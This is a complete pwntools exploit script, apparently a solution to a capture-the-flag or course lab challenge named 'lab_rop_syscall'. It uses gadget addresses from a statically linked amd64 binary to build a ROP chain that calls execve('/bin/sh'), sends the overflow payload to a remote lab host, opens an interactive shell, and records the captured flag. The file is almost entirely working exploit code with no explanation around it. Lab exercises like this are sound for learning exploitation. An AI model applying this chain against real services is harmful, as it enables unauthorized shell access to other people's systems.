from pwn import *

# ./src/lab_rop_syscall/share/chal: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=c3e00be366ebaff1d0a67e6a6291b5768f740450, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# %rdi: const char *filename
# %rsi: const char *const argv[]
# %rdx: const char *const envp[]
# %rax: 59
# syscall

# 0x0000000000401f0f : pop rdi ; ret
# 0x0000000000409f7e : pop rsi ; ret
# 0x0000000000485e0b : pop rdx ; pop rbx ; ret
# 0x0000000000450087 : pop rax ; ret

# Strings information
# ============================================================
# 0x0000000000498027 : /bin/sh

#   401cc4:	0f 05                	syscall

context.arch = 'amd64'

pop_rdi = 0x0000000000401f0f
pop_rsi = 0x0000000000409f7e
pop_rdx_rbx = 0x0000000000485e0b
pop_rax = 0x0000000000450087

bin_sh = 0x0000000000498027
syscall = 0x401cc4

# p = process('./src/lab_rop_syscall/share/chal')
p = remote('10.113.184.121', 10052)

# gdbscript = 'gef\ngef\n'
# gdbscript += 'set follow-fork-mode child\n'

# _pid = gdb.attach(
#     p,
#     gdbscript=gdbscript,
# )

rop_chain = flat([
    #
    pop_rdi,
    bin_sh,
    pop_rsi,
    0,
    pop_rdx_rbx,
    0,
    0,
    pop_rax,
    59,
    syscall,
])

payload = b'a' * 0x18 + rop_chain

p.recvuntil(b'> ')
p.sendline(payload)

p.interactive()

# flag{www.youtube.com/watch?v=apN1VxXKio4}
